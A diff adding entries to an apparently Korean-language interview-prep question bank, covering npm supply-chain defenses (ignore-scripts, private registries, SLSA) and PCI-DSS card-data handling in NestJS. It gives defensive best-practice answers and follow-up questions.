+    "seniorTip": "공급망 보안 체크리스트: 1) npm install --ignore-scripts를 기본으로 사용. 2) CI 환경에서 빌드 시 외부 네트워크 차단(Air-gapped). 3) Private Registry(Artifactory, Nexus)를 통해 승인된 패키지만 설치. 4) npm ci로 package-lock.json을 엄격하게 사용. 5) Dependabot 또는 Renovate Bot으로 의존성 업데이트를 자동화하되, Major 버전 업그레이드는 수동 검토. 6) Socket.dev, Snyk Code로 패키지의 postinstall 스크립트를 사전 분석. 7) SBOM에 postinstall 스크립트가 있는 패키지를 별도 표시.",
+    "deepDive": "npm의 workspaces 환경에서 --ignore-scripts 적용 시 monorepo 빌드 과정에서 필수적인 postinstall(Husky, Prisma generate 등)을 어떻게 선택적으로 허용하는가? → GitHub Actions에서 npm install을 실행할 때 아웃바운드 네트워크를 최소화하는 방법(Private Registry, Caching)은? → Supply Chain Attack의 SLSA(Supply chain Levels for Software Artifacts) 프레임워크가 정의하는 4단계 성숙도 모델은?",
+    "tags": [
+      "공급망 공격",
+      "postinstall",
+      "npm",
+      "보안",
+      "SLSA"
+    ]
+  },
+  {
+    "id": "sec-055",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "short-answer",
+    "question": "PCI-DSS(Payment Card Industry Data Security Standard) 준수가 필요한 결제 서비스에서 카드 정보 데이터 흐름을 설계할 때 핵심 원칙과 NestJS 환경에서의 구현 방법을 설명하세요.",
+    "answer": "PCI-DSS의 핵심: 카드 데이터가 자사 서버를 최대한 통과하지 않도록 설계(PCI Scope 최소화). PG사의 JavaScript SDK 또는 iFrame으로 카드 정보를 PG사에 직접 전송하고, 서버에는 토큰만 전달. 불가피하게 처리해야 한다면 카드 번호는 마스킹/토큰화하여 저장한다.",
+    "explanation": "PCI-DSS 요구사항: Requirement 3 — 저장 카드 데이터 보호(AES-256 암호화, PAN 마스킹). Requirement 4 — 전송 중 암호화(TLS 1.2 이상). Requirement 6 — 보안 취약점 관리(npm audit, DAST). Requirement 8 — 접근 제어(MFA, 최소 권한). NestJS에서 PAN(카드번호)을 로그에 출력하거나 DB에 평문 저장하면 즉시 위반이다.",
+    "seniorTip": "PCI Scope 최소화 전략: 1) 카드 입력 UI를 PG사 iFrame으로 교체 — 자사 서버를 카드 정보가 통과하지 않음. 2) PG사의 토큰(Token)만 수신하여 처리. 3) 불가피한 경우(인-앱 결제 등): 카드 정보 수신 즉시 토큰화, 원본 PAN 즉시 메모리에서 제거, 로그에서 PAN 자동 마스킹. 4) 서버 환경 격리: 카드 처리 서버는 별도 K8s 네임스페이스 + 엄격한 NetworkPolicy. 5) 분기 1회 취약점 스캔(ASV 스캔) + 침투 테스트. 6) 결제 관련 CloudTrail/로그는 1년 이상 보존.",
+    "deepDive": "PCI-DSS SAQ(Self-Assessment Questionnaire)의 유형(SAQ A, SAQ A-EP, SAQ D)과 각 유형에 해당하는 시스템 구성은? → 카드 데이터가 자사 서버를 통과하지 않는 PCI SAQ A 환경에서도 취약점 스캔이 필요한 이유는? → Tokenization과 Encryption의 차이, 그리고 결제 재처리(Recurring Payment)에서 PG사 토큰을 안전하게 관리하는 방법은?",
+    "tags": [
+      "PCI-DSS",
+      "결제 보안",
+      "카드 데이터",
+      "토큰화",
+      "컴플라이언스"
+    ]
   }
 ]
